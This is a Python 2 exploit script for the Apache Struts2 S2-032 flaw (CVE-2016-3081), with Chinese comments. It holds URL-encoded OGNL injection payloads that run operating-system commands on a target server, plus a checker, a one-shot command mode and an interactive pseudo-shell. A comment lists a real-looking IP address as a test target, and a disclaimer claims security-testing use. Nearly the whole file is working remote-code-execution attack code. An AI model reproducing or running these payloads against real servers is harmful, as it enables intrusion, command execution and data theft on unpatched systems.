#!-*- coding:utf-8 -*-
import sys
import requests
import re
# Author: CF_HB
# CreatedTime: 2016-04-28
# 测试地址: http://122.224.255.238/admin/adminlogin.action
# 接收命令执行结果40K的数据，可以自己替换: 40960
#########################################################################################
# 自定义设置区域#
headers = {'user-agent':'Mozilla/2.0 (Windows NT 3.1; rv:42.0) Gecko/200101 Firefox/12.0',
    'Cookie':'JSESSIONID=75C9ED1CD9345SAWA328D2SA6812',
    'SOAPAction':'""',
    'Safety-Testing':'By CF_HB',
    }
proxy = {'http': 'http://127.0.0.1:8080'}
timeout = 5
# 用于POC鉴别是否存在漏洞
hashKey = "This_site_has_s2-032_vulnerabilities"
# 使用说明
notice = u'''    S2-032辅助工具V1.0
#    Author: CF_HB
#    CreatedTime: 2016-04-28
#    漏洞编号:(CVE-2016-3081)
#V1.0功能说明:
#     1) 漏洞检查
#     2) 漏洞命令执行
#     3) POC和EXP可以自定义添加
#     4) 暂只支持GET方式提交payload
#To Do:
#     1) 支持POST类型提交
#     2) 支持IP+PORT(http://114.114.114.114:8080/)类型的自动化检测
#     3) 随时补充POC和EXP
#用法说明如下:
#     1) 检查目标是否存在S2-032漏洞用法
#     usage: python S2032.py http://www.test.com/login.action check
#     2) 一句话命令执行
#     usage: python S2032.py http://www.test.com/login.action "net user"
#     3) 交互式命令执行(反弹shell下，或者终端下面使用.)
#     usage: python S2032.py http://www.test.com/login.action cmdtool
#####声明:
#       本脚本仅用于安全测试，请勿用于违法犯罪!
'''
###########################################################################################
S2032POC = []
# POC集合
# 在POC的判断点替换成：This_site_has_s2-032_vulnerabilities
S2032POC.append("?test=This_site_has_s2-032_vulnerabilities&method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23str%3d%23parameters.test,%23res%3d@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23res.print(%23str[0]),%23res.flush(),%23res.close")
S2032POC.append("?method:%23_memberAccess%3d%40ognl%2eOgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java%2elang%2eRuntime%40getRuntime%28%29%2eexec%28%23parameters.command[0]%29%2egetInputStream%28%29%2c%23b%3dnew%20java%2eio%2eInputStreamReader%28%23a%29%2c%23c%3dnew%20java%2eio%2eBufferedReader%28%23b%29%2c%23d%3dnew%20char%5b40960%5d%2c%23c%2eread%28%23d%29%2c%23kxlzx%3d%40org%2eapache%2estruts2%2eServletActionContext%40getResponse%28%29%2egetWriter%28%29%2c%23kxlzx%2eprintln%28%23d%29%2c%23kxlzx%2eclose&command=echo  This_site_has_s2-032_vulnerabilities")

S2032EXP = []

# command_exp集合
# 新的EXP在执行命令的点设置为:GiveMeCommand,然后像下面的方式添加即可
# nsf_exp
S2032EXP.append("?method:%23_memberAccess%3d%40ognl%2eOgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java%2elang%2eRuntime%40getRuntime%28%29%2eexec%28%23parameters.command[0]%29%2egetInputStream%28%29%2c%23b%3dnew%20java%2eio%2eInputStreamReader%28%23a%29%2c%23c%3dnew%20java%2eio%2eBufferedReader%28%23b%29%2c%23d%3dnew%20char%5b40960%5d%2c%23c%2eread%28%23d%29%2c%23kxlzx%3d%40org%2eapache%2estruts2%2eServletActionContext%40getResponse%28%29%2egetWriter%28%29%2c%23kxlzx%2eprintln%28%23d%29%2c%23kxlzx%2eclose&command=GiveMeCommand")
# shack2_exp
S2032EXP.append("?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=GiveMeCommand&pp=\\\\A&ppp=%20&encoding=UTF-8")
S2032EXP.append("?method:%23_memberAccess[%23parameters.name1[0]]%3dtrue,%23_memberAccess[%23parameters.name[0]]%3dtrue,%23_memberAccess[%23parameters.name2[0]]%3d{},%23_memberAccess[%23parameters.name3[0]]%3d{},%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew%20java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&name=allowStaticMethodAccess&name1=allowPrivateAccess&name2=excludedPackageNamePatterns&name3=excludedClasses&cmd=GiveMeCommand&pp=\\\\AAAA&ppp=%20&encoding=UTF-8 ")
# 用于鉴别EXP是否成功利用的错误关键字
Error_Message = [r'</[^>]+>', r'Error report', r'Apache Tomcat', r'memberAccess', r'ServletActionContext']


def VerityS2032(url, S2032POC):
    try:
        k = (len(url)+10)/2 + 10
        poc_count = 1
        print u"You have "+str(len(S2032POC))+" POCS"
        for poc in S2032POC:
            targetURL = url+poc
            print '-'*k+"trying poc "+str(poc_count)+'-'*(k-2)
            req = requests.get(targetURL, headers=headers, timeout=timeout)
            resulttext = req.text.encode("utf-8").strip().strip('\x00')
            if hashKey in resulttext:
                print '-'*k+"Successful"+"-"*k
                # print '--vulnerabilityS2-032 --'
                print '--'+url+"  is vulnerable [S2-032(CVE-2016-3081)]"
                print '-'*(len(url)+40)
                return True
            else:
                poc_count = poc_count + 1
                pass
        print "This Target is not vulnerable"
        return False
    except Exception, e:
        print "something error!!"
        return False

def ExcuteOsCommand(url, yourcommand, S2032EXP):
    try:
        exp_k = (len(url)+10)/2 + 10
        print u"You have "+str(len(S2032EXP))+" EXPS"
        exp_count = 1
        exp_over = False
        for exp in S2032EXP:
            exp_wrong = True
            print '-'*exp_k+"trying exp "+str(exp_count)+'-'*(exp_k+7)
            comm = exp.replace("GiveMeCommand", str(yourcommand))
            # targetURL = url
            targetURL = url+comm
            req = requests.get(targetURL, headers=headers, timeout=timeout)
            resulttext = req.text.encode("utf-8").strip()

            comdresulttext = resulttext.strip('\x00')
            for p in Error_Message:
                m = re.search(p, comdresulttext)
                if m:
                    exp_wrong = True
                    break
                else:
                    exp_wrong = False
                    continue
            if exp_wrong:
                exp_count = exp_count + 1
                exp_over = False
                continue
            else:
                print '-'*exp_k+"Executed successfully"+'-'*(exp_k-2)
                print '-'*14
                print 'Command# '+yourcommand
                print '-'*14
                print "Result:"
                print '-'*exp_k
                print comdresulttext
                print '-' * exp_k
                exp_over = True
                break
        if not exp_over:
            print "All EXP failed..."
    except Exception, e:
        # print e
        print "something error!!"


def CommandTool(url):
    flag = VerityS2032(url, S2032POC)
    if flag:
        print "[+] Connecting to target ..."
        while True:
            comm = raw_input("~$ ")
            if 'q' == comm:
                print "exit...."
                exit(0)
            elif comm != "":
                ExcuteOsCommand(url, comm, S2032EXP)
    else:
        print "the website is not vulnerable"
if __name__ == "__main__":
    if len(sys.argv) == 3 and "http" in sys.argv[1]:
        target_url = sys.argv[1]
        order = sys.argv[2]
        if "check" == order:
            VerityS2032(target_url, S2032POC)
            exit(0)
        elif "cmdtool" == order:
            CommandTool(target_url)
        else:
            ExcuteOsCommand(target_url, order, S2032EXP)
            exit(0)
    else:
        print '-' * 90
        print '#' + notice + "#"
        print '-' * 90

